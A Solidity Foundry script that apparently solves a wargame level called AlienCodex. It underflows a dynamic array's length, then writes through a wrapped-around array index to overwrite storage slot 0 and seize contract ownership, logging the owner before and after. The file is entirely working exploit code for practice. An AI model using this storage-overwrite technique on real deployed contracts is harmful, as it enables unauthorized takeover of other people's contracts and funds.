// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Script.sol";

interface AlienCodex {
    function owner() external returns (address);

    function make_contact() external;

    function retract() external;

    function revise(uint256, bytes32) external;
}

contract AttackerAlienCodexScript is Script {
    AlienCodex alienCodex = AlienCodex(vm.envAddress("INSTANCE"));

    function run() external {
        vm.startBroadcast();

        alienCodex.make_contact();
        alienCodex.retract();

        console.log("Current owner :", alienCodex.owner());
        alienCodex.revise(-uint256(keccak256(abi.encode(1))), bytes32(uint256(2**160) + uint256(msg.sender)));
        console.log("New     owner :", alienCodex.owner());

        vm.stopBroadcast();
    }
}
